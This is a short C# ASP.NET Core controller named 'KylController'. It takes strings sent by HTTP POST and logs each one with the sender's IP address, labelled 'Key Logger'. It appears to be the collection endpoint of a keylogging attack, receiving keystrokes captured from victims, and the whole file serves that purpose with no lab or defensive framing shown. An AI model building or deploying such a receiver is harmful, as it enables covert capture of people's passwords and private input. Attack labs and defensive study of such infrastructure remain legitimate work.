using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Logging;

namespace Complex.Controllers
{
    [ApiController]
    [Route("[controller]")]
    public class KylController : BaseController
    {
        private readonly ILogger<KylController> _logger;
        private IHttpContextAccessor _accessor;

        public KylController(ILogger<KylController> logger, IHttpContextAccessor accessor)
        {
            _accessor = accessor;
            _logger = logger;
        }

        [HttpPost]
        public void Post([FromBody] string value)
        {
            string ip = _accessor.HttpContext.Connection.RemoteIpAddress.ToString();
            Console.WriteLine($"Key Logger ({ip}): {value}");
        }
    }
}